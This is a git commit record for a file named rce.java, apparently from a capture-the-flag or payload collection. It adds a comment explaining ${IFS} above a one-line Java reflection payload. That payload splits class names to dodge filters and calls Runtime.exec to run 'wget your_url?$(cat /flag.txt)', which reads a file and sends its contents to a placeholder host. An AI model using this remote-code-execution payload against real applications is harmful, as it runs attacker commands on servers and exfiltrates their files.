bf7551075699566bf9783f5309e090f9fc4673ac
tntminh <137958525+tntminh@users.noreply.github.com>
2024-09-23 11:30:13 +0700

    Update rce.java

--- rce.java
+++ rce.java
@@ -1,1 +1,3 @@
+//${IFS} represents the Internal Field Separator (usually a space).
+
 "X".getClass().forName("ja"+"va.lang.R"+"untime").getDeclaredMethod("getRu"+"ntime").invoke(null).exec("sh -c wget${IFS}your_url?$(cat${IFS}/flag.txt)")}__::.x')
